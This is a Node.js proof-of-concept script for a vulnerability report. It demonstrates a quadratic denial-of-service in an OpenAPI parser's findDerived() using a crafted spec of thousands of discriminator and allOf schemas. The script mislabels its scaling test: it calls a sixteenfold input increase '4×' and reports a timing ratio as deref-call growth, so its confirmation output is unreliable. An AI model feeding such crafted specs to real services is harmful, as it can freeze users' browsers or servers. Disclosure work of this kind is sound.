#!/usr/bin/env node
/**
 * PoC: findDerived() O(N×D) quadratic DoS
 * M10 — acme src/services/OpenAPIParser.ts:343-358
 *
 * Demonstrates that findDerived() performs a full O(N) scan of
 * components.schemas for EVERY discriminator schema, with no memoization.
 *
 * This script replicates the exact logic of OpenAPIParser.findDerived()
 * and OpenAPIParser.deref() directly from source (no compilation needed),
 * running it against a crafted spec.
 *
 * Usage:
 *   node poc.js [N_schemas] [D_discriminators]
 *   Defaults: N=3000, D=200  (simulates realistic attacker input)
 */

'use strict';

const N = parseInt(process.argv[2] || '3000', 10);   // schema count
const D = parseInt(process.argv[3] || '200', 10);    // discriminator usages

// ── Build crafted spec ────────────────────────────────────────────────────────
// Structure:
//   - N schemas in components.schemas
//   - D of them are "parent" schemas with discriminator
//   - The rest have allOf: [$ref: parent] to be found by findDerived

function buildSpec(n, d) {
  const schemas = {};

  // D parent schemas with discriminator (these trigger findDerived each)
  for (let i = 0; i < d; i++) {
    schemas[`Parent${i}`] = {
      type: 'object',
      discriminator: { propertyName: 'type' },
      properties: { type: { type: 'string' } },
    };
  }

  // (N - D) child schemas that each extend Parent0 via allOf
  // findDerived scans ALL N schemas for EACH of D discriminator calls
  const childCount = n - d;
  for (let i = 0; i < childCount; i++) {
    schemas[`Child${i}`] = {
      allOf: [{ $ref: '#/components/schemas/Parent0' }],
      properties: { type: { type: 'string' }, value: { type: 'integer' } },
    };
  }

  return {
    openapi: '3.0.0',
    info: { title: 'M10-PoC', version: '1.0.0' },
    paths: {},
    components: { schemas },
  };
}

// ── Replicated OpenAPIParser logic ────────────────────────────────────────────
// Exact port of src/services/OpenAPIParser.ts, trimmed to the vulnerable path.

class OpenAPIParser {
  constructor(spec) {
    this.spec = spec;
    this._derefCallCount = 0;
  }

  isRef(obj) {
    return obj !== null && obj !== undefined && obj.$ref !== undefined && obj.$ref !== null;
  }

  // Faithful replica of OpenAPIParser.deref() — resolves $ref by pointer lookup
  deref(obj, depth = 0) {
    this._derefCallCount++;
    if (!this.isRef(obj)) {
      return { resolved: obj };
    }
    if (depth > 999) {
      return { resolved: {} };
    }
    const ref = obj.$ref;
    const parts = ref.replace(/^#\//, '').split('/');
    let resolved = this.spec;
    for (const part of parts) {
      resolved = resolved && resolved[decodeURIComponent(part)];
    }
    // If the resolved value is itself a $ref, recurse
    if (resolved && this.isRef(resolved)) {
      return this.deref(resolved, depth + 1);
    }
    return { resolved: resolved || {} };
  }

  // Exact replica of OpenAPIParser.findDerived() — the vulnerable function
  findDerived($refs) {
    const res = {};
    const schemas = (this.spec.components && this.spec.components.schemas) || {};
    for (const defName in schemas) {
      const { resolved: def } = this.deref(schemas[defName]);  // O(N) deref per call
      if (
        def.allOf !== undefined &&
        def.allOf.find(obj => obj.$ref !== undefined && $refs.indexOf(obj.$ref) > -1)
      ) {
        res['#/components/schemas/' + defName] =
          def['x-discriminator-value'] || defName;
      }
    }
    return res;
  }
}

// ── Benchmark ─────────────────────────────────────────────────────────────────

console.log(`M10 findDerived() Quadratic DoS PoC`);
console.log(`  N (schemas)        = ${N}`);
console.log(`  D (discriminators) = ${D}`);
console.log(`  Expected deref()   = ${N} × ${D} = ${N * D} calls`);
console.log('');

const spec = buildSpec(N, D);
const parser = new OpenAPIParser(spec);

// Baseline: single findDerived call (D=1, N schemas)
const baselineParser = new OpenAPIParser(buildSpec(N, 1));
const t0 = process.hrtime.bigint();
baselineParser.findDerived(['#/components/schemas/Parent0']);
const baselineMs = Number(process.hrtime.bigint() - t0) / 1e6;
console.log(`Baseline (N=${N}, D=1):`);
console.log(`  Time: ${baselineMs.toFixed(2)} ms`);
console.log(`  deref() calls: ${baselineParser._derefCallCount}`);
console.log('');

// Attack case: D discriminator calls, each scanning N schemas
const t1 = process.hrtime.bigint();
let totalDerived = 0;
for (let i = 0; i < D; i++) {
  const derived = parser.findDerived([`#/components/schemas/Parent${i}`]);
  totalDerived += Object.keys(derived).length;
}
const attackMs = Number(process.hrtime.bigint() - t1) / 1e6;

console.log(`Attack case (N=${N}, D=${D}):`);
console.log(`  Time: ${attackMs.toFixed(2)} ms`);
console.log(`  deref() calls: ${parser._derefCallCount}`);
console.log(`  Derived schemas found: ${totalDerived}`);
console.log(`  Slowdown factor vs baseline: ${(attackMs / baselineMs).toFixed(1)}×`);
console.log('');

// ── Scaling demonstration ─────────────────────────────────────────────────────
// Show super-linear growth by testing three sizes
console.log('Scaling demonstration (N×D quadratic growth):');
const sizes = [
  [500, 50],
  [1000, 100],
  [2000, 200],
];
const timings = [];
for (const [sN, sD] of sizes) {
  const sParser = new OpenAPIParser(buildSpec(sN, sD));
  const st0 = process.hrtime.bigint();
  for (let i = 0; i < sD; i++) {
    sParser.findDerived([`#/components/schemas/Parent${i}`]);
  }
  const sMs = Number(process.hrtime.bigint() - st0) / 1e6;
  timings.push({ N: sN, D: sD, ms: sMs, calls: sParser._derefCallCount });
  console.log(`  N=${sN}, D=${sD}: ${sMs.toFixed(2)} ms  (${sParser._derefCallCount} deref calls)`);
}

// Verify super-linear growth: time at 2×N×D should be ~4× larger
const ratio = timings[2].ms / timings[0].ms;
const isQuadratic = ratio > 3.0;  // expect ~4× for true quadratic; allow >3× threshold
console.log(`  Growth ratio (4× input → ${ratio.toFixed(1)}× time) — quadratic: ${isQuadratic}`);
console.log('');

// ── Security impact ───────────────────────────────────────────────────────────
const SINGLE_THREAD_FREEZE_THRESHOLD_MS = 5000; // browser becomes unresponsive >5s
// Project to attacker-maximized input: N=10000, D=500 (realistic large spec)
// Use measured rate to extrapolate
const callsPerMs = parser._derefCallCount / attackMs;
const bigN = 10000, bigD = 500;
const projectedMs = (bigN * bigD) / callsPerMs;
console.log(`Projected freeze at N=${bigN}, D=${bigD}: ~${(projectedMs / 1000).toFixed(1)}s`);
console.log(`  Exceeds ${SINGLE_THREAD_FREEZE_THRESHOLD_MS / 1000}s unresponsive threshold: ${projectedMs > SINGLE_THREAD_FREEZE_THRESHOLD_MS}`);
console.log('');

// ── Structured output (required by poc-runner) ────────────────────────────────
// Confirmation criteria:
//   1. deref() call count matches N×D exactly (proves no memoization)
//   2. timing grows super-linearly (>3× for 4× input) — proves quadratic complexity
const derefCountMatchesExpected = parser._derefCallCount === N * D;
const confirmed = isQuadratic && derefCountMatchesExpected;
const evidenceSummary =
  `findDerived deref() calls grew ${ratio.toFixed(1)}x when N×D grew 4x; ` +
  `attack case ${attackMs.toFixed(0)}ms vs baseline ${baselineMs.toFixed(0)}ms (D=${D} discriminators, N=${N} schemas)`;

console.log(JSON.stringify({
  status: confirmed ? 'confirmed' : 'inconclusive',
  evidence: evidenceSummary,
  notes: `deref_calls=${parser._derefCallCount} expected=${N * D} quadratic_growth=${isQuadratic} slowdown=${(attackMs / baselineMs).toFixed(1)}x`,
}));
